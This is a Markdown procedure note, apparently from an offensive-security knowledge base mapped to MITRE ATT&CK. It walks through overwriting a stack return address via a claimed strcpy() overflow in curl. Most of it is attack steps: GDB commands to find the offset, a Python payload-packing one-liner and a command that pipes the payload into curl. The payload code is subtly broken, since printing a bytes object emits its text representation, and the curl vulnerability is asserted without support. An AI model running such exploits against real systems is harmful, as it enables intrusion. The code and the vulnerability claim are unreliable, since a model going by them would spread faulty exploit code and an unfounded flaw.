---
tags:
  - buffer-overflow
  - return-address
type: procedure
tools:
  - '[[tools/GDB]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:49.779Z'
sub_techniques: []
id: 70936f6f-d04a-4986-aaec-76dcb01a1178
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Craft-Input-to-Overwrite-Return-Address

## Summary

This procedure refines the payload to fill the buffer and overwrite the return address (e.g., at 0x7fffffffd9b8) with a controlled value like 0x4005d0, targeting a shell function.

## Description

Using insights from monitoring, calculate offset and pack the address into input for curl's strcpy(). Linux environment with ASLR disabled for simplicity. Outcomes: Hijacked control flow upon return. Prerequisites: Overflow confirmed, address of target function known.

## Requirements

1. Knowledge of buffer offset from GDB
2. Target address (e.g., system() at 0x4005d0)
3. Python for struct packing

## Defense

Defensive measures and detection strategies:

- Enable ASLR to randomize addresses
- Stack canaries to detect overwrites
- Input validation to prevent large payloads

## Objectives

1. Compute precise offset
2. Embed return address in payload
3. Test without premature crash

## Instructions

### Step 1: Determine Offset

**Context**: Use GDB to find distance to return address.

**Command**:

```bash
(gdb) run -d junk http://target
(gdb) x/10gx $rsp  # Find return addr location
```

> Offset e.g., 200 bytes; output shows original 0x7fffffffd9b8.

### Step 2: Build Payload

**Context**: Pack address after padding.

**Command**:

```bash
python3 -c "import struct; print(b'A'*200 + struct.pack('<Q', 0x4005d0))" > exploit.txt
```

> Creates binary payload.

### Step 3: Test Overwrite

**Context**: Feed to curl and check in GDB.

**Command**:

```bash
cat exploit.txt | ./curl -d @- http://target
(gdb) continue  # Post-input
```

> Expected: Return address now 0x4005d0.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/GDB]]

## Tags

- buffer-overflow
- return-address
